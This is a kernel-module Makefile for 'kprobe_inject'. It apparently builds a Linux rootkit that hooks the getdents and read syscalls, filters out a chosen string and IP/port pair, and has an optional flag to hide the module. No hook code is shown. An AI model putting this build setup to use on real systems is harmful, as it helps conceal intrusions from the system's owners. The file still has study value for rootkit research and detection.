obj-m += kprobe_inject.o
kprobe_inject-objs := src/kprobe_inject.o \
                      src/hooks/x64_sys_getdents.o \
                      src/hooks/x64_sys_read.o \
                      src/utils/ftrace_utils.o \
                      src/utils/kprobe_utils.o \
                      src/utils/proc_utils.o \
                      src/utils/excludes/ip_filtering.o \
                      src/utils/excludes/string_filtering.o

EXTRA_CFLAGS += -I$(PWD)/include -DSTRING_EXCLUDES="\"SENSITIVE\"" -DNET_EXCLUDES="\"127.0.0.1,12345\""
#EXTRA_CFLAGS += -DHIDE_MODULE

all:
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean

